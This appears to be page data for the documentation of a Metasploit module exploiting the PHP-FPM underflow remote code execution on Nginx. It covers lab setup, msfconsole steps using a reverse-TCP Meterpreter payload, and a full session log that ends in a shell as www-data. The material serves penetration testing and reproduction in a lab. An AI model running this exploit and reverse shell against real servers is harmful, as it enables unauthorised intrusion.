{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/php_fpm_rce","result":{"data":{"moduleMetadataJson":{"id":"68981cfc-0397-576e-85fd-88736e849c3c","name":"PHP-FPM Underflow RCE","fullname":"exploit/multi/http/php_fpm_rce","description":"This module exploits an underflow vulnerability in versions 7.1.x\n          below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on\n          Nginx. Only servers with certains Nginx + PHP-FPM configurations are\n          exploitable. This is a port of the original neex's exploit code (see\n          refs.). First, it detects the correct parameters (Query String Length\n          and custom header length) needed to trigger code execution. This step\n          determines if the target is actually vulnerable (Check method). Then,\n          the exploit sets a series of PHP INI directives to create a file\n          locally on the target, which enables code execution through a query\n          string parameter. This is used to execute normal payload stagers.\n          Finally, this module does some cleanup by killing local PHP-FPM\n          workers (those are spawned automatically once killed) and removing\n          the created local file.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/php_fpm_rce","documentationSlug":"/modules/documentation/exploit/multi/http/php_fpm_rce","referencesSlug":"/modules/references/exploit/multi/http/php_fpm_rce"},"documentation":{"html":"<p>This module exploits an underflow vulnerability in versions 7.1.x below 7.1.33,\n7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on Nginx. Only servers\nwith certains Nginx + PHP-FPM configurations are exploitable. This is a port of\nthe original neex's exploit code (see refs.). First, it detects the correct\nparameters (Query String Length and custom header length) needed to trigger\ncode execution. This step determines if the target is actually vulnerable\n(Check method). Then, the exploit sets a series of PHP INI directives to create\na file (<code class=\"language-text\">/tmp/a</code>) locally on the target, which enables code execution through a\nquery string parameter (<code class=\"language-text\">?a=&lt;cmd&gt;</code>). This is used to execute normal payload\nstagers. Finally, this module does some cleanup by killing local PHP-FPM\nworkers (those are spawned automatically once killed) and removing the created\nlocal file (<code class=\"language-text\">/tmp/a</code>).</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<ul>\n<li>Install Nginx on Linux (<code class=\"language-text\">apt-get install nginx</code>)</li>\n<li>get the vulnerable PHP:</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">git clone https://github.com/php/php-src\n# checkout the fix\ngit -C php-src checkout ab061f95ca966731b1c84cf5b7b20155c0a1c06a\n# checkout the commit previous to the fix\ngit -C php-src checkout HEAD~1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ul>\n<li>make sure the default Nginx configuration contains these entries and no\nscript existence checks (like <code class=\"language-text\">try_files</code>):</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">location ~ [^/]\\.php(/|$) {\n  ...\n  fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n  fastcgi_param PATH_INFO       $fastcgi_path_info;\n  fastcgi_pass   php:9000;\n  ...\n}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>See original PoC for details: <a href=\"https://github.com/neex/phuip-fpizdam\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/neex/phuip-fpizdam</a></p>\n<p>An easiest way to setup a vulnerable instance is to use the docker\nconfiguration provided by the author\n(<a href=\"https://github.com/neex/phuip-fpizdam/tree/master/reproducer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/neex/phuip-fpizdam/tree/master/reproducer</a>)</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Preparing the target:</p>\n<ol>\n<li><code class=\"language-text\">git clone https://github.com/neex/phuip-fpizdam</code></li>\n<li><code class=\"language-text\">cd phuip-fpizdam/reproducer/</code></li>\n<li><code class=\"language-text\">docker build -t reproduce-cve-2019-11043 .</code></li>\n<li><code class=\"language-text\">docker run --rm -p 192.168.6.6:8080:80 --name reproduce-cve-2019-11043 reproduce-cve-2019-11043</code></li>\n</ol>\n<p>  Running the exploit:</p>\n<ol>\n<li><code class=\"language-text\">./msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/multi/http/php_fpm_rce</code></li>\n<li><code class=\"language-text\">set RHOSTS 192.168.6.6</code></li>\n<li><code class=\"language-text\">set RPORT 8080</code></li>\n<li><code class=\"language-text\">set TARGETURI /script.php</code></li>\n<li><code class=\"language-text\">set PAYLOAD php/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">set LHOST 192.168.6.6</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>   <strong>TARGETURI</strong>\nPath to a PHP page (<code class=\"language-text\">/index.php</code> by default). This must be a valid page.</p>\n<h2 id=\"advanced-options\" style=\"position:relative;\"><a href=\"#advanced-options\" aria-label=\"advanced options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Advanced Options</h2>\n<p>  <strong>MinQSL</strong>\nMinimum query string length (QSL). The QSL detection engine will iterate\nstarting from this value (1500 by default). This option is required.</p>\n<p>  <strong>MaxQSL</strong>\nMaximum query string length (QSL). The QSL detection engine will iterate\nuntil this value is reached (1950 by default). This option is required.</p>\n<p>  <strong>QSLHint</strong>\nQuery string length hint. This value will be used as a QSL candidate. Note\nthat setting this value skips the QSL detection.</p>\n<p>  <strong>QSLDetectStep</strong>\nQuery string length detect step. The QSL detection engine will iterate with\nthis step value (5 by default). This option is required.</p>\n<p>  <strong>MaxQSLCandidates</strong>\nMaximum query string length candidates. When the number of QSL candidates\nfound during the QSL detection phase is greater than this value (10 by\ndefault), this indicates that something went wrong and we were not able to\ndetect the correct values. This option is required.</p>\n<p>  <strong>MaxQSLDetectDelta</strong>\nMaximum query string length detection delta. This value is the maximum\ndistance between the candidate and the extended values (10 by default). For\nexample, with a value of 20 and QSLDetectStep set to 5, candidate [1700] will\nbe extended to [1680, 1685, 1690, 1695, 1700]. This option is required.</p>\n<p>  <strong>MaxCustomHeaderLength</strong>\nMaximum custom header length. This value is the maximum length that will be\nused for the custom header during the parameters detection (256 by default).\nThis option is required.</p>\n<p>  <strong>CustomHeaderLengthHint</strong>\nCustom header length hint. This value will be used as the custom header\nlength. Note that setting this value skips the custom header length\ndetection.</p>\n<p>  <strong>DetectMethod</strong>\nMethod that will be used to detect if the target is vulnerable. Available\nmethods:</p>\n<ol>\n<li><code class=\"language-text\">session.auto_start</code>: this method consist in setting the\n<code class=\"language-text\">session.auto_start</code> PHP option to 1. If the response contains <code class=\"language-text\">PHPSESSID=</code>\nset-cookie value, this means the PHP option has been correctly set and the\ntarget is vulnerable.</li>\n<li><code class=\"language-text\">output_handler.md5</code>: this method consist in setting the <code class=\"language-text\">output_handler</code>\nPHP option to <code class=\"language-text\">md5</code>. If the response is a md5 hash (16 characters), this\nmeans the PHP option has been correctly set and the target is vulnerable.</li>\n</ol>\n<p>  <strong>OperationMaxRetries</strong>\nMaximum of operation retries. Each operation will be repeated at most\n<code class=\"language-text\">OperationMaxRetries</code> times.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1804--nginx-1140--php-7133dev-fpm-fcgi-built-feb-14-2020-164815\" style=\"position:relative;\"><a href=\"#ubuntu-1804--nginx-1140--php-7133dev-fpm-fcgi-built-feb-14-2020-164815\" aria-label=\"ubuntu 1804  nginx 1140  php 7133dev fpm fcgi built feb 14 2020 164815 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 18.04 + nginx 1.14.0 + PHP 7.1.33dev (fpm-fcgi) (built: Feb 14 2020 16:48:15)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/php_fpm_rce\nmsf5 exploit(multi/http/php_fpm_rce) &gt; set RHOSTS 192.168.6.6\nRHOSTS =&gt; 192.168.6.6\nmsf5 exploit(multi/http/php_fpm_rce) &gt; set RPORT 8080\nRPORT =&gt; 8080\nmsf5 exploit(multi/http/php_fpm_rce) &gt; set TARGETURI /script.php\nTARGETURI =&gt; /script.php\nmsf5 exploit(multi/http/php_fpm_rce) &gt; set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD =&gt; php/meterpreter/reverse_tcp\nmsf5 exploit(multi/http/php_fpm_rce) &gt; set LHOST 192.168.6.6\nLHOST =&gt; 192.168.6.6\nmsf5 exploit(multi/http/php_fpm_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.6.6:4444\n[*] Sending baseline query...\n[*] Detecting QSL...\n[+] The target is probably vulnerable. Possible QSLs: [1765]\n[*] Doing sanity check...\n[*] Detecting attack parameters...\n[+] Parameters found: QSL=1760, customh_length=69\n[+] Target is vulnerable!\n[*] Performing attack using php.ini settings...\n[+] Success! Was able to execute a command by appending &#39;which+which&#39;\n[*] Trying to cleanup /tmp/a...\n[+] Cleanup done!\n[*] Sending payload...\n[*] Sending stage (38288 bytes) to 192.168.6.6\n[*] Meterpreter session 1 opened (192.168.6.6:4444 -&gt; 192.168.6.6:59177) at 2020-02-14 12:03:45 -0600\n[+] Session created\n[*] Remove /tmp/a and kill workers...\n[+] Done!\n\nmeterpreter &gt; getuid\nServer username: www-data (33)\nmeterpreter &gt; sysinfo\nComputer    : 832efebeac57\nOS          : Linux 832efebeac57 4.9.184-linuxkit #1 SMP Tue Jul 2 22:58:16 UTC 2019 x86_64\nMeterpreter : php/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"68981cfc-0397-576e-85fd-88736e849c3c"}}}